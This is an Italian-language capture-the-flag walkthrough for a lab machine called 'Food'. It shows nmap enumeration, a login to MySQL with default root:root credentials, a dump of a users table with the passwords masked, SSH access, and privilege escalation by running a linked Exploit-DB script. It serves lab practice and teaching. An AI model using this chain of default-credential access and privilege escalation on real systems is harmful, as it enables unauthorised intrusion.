# FOOD

## ENUMERAZIONE

scan della macchina per torvare possibili porte e la versione di queste.

```bash
nmap food.thm -sV -sC 
```

dalla scansione notato che è aperto un servizio sql andiamo ad analizzarlo meglio con nmap.

```bash
nmap food.thm -sV --script *sql* 
```
quando nmap finisce lo scan ci restituisce dati molto utili, per esempio che l'utente di mysql è root:root
e questo ci da carta bianca sulla conessione all'sql.

## SERVIZIO SQL

quindi colleghiamoci all'sql e vediamo che dati contiene

```bash
mysql -u root -h 10.10.79.244 -p
```
successivamente mi faccio dumpare tutti i database presenti.

```bash
show databases;
```
```bash
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
```
ecco la tables che ci serve andiamo a prenderla.
```bash
use users
```
e successivamente. 
```bash
show tables;
```
adesso abbiamo trovato una tables di nome user andiamo a leggere cosa c'è dentro.
```bash
SELECT * FROM User;
```


ramen    ***************                       
flag     ************************************* 


ecco un utente con la sua password e un flag!

entriamo in ssh.

## SSH
```bash
ssh ramen@food.thm
```
controllate in giro ci dovrebbero essere altre flag che potete prendere.

facendo un controllo dei permessi che abbiamo.
ho notato che possiamo fare davvero molto poco, quindi sono andato a cercare le vulnerabilità per quanto riguarda GNU, e ne ho trovata una davvero interessate
andiamo ad utilizzarla.

## PRIVILEGE ESCALATION

https://www.exploit-db.com/exploits/41154 ho usato questo exploit per fare priv esc,
questo exploit sfrutta un autenticazione di livello maggiore(root) e ci permette tramite un vulnerabilità presente in 
quest'ultima di fare priv esc.

una volta scaricato lo script lo passiamo sulla macchina il gioco è fatto.
```bash
chmod +x script.sh
./script.sh
```
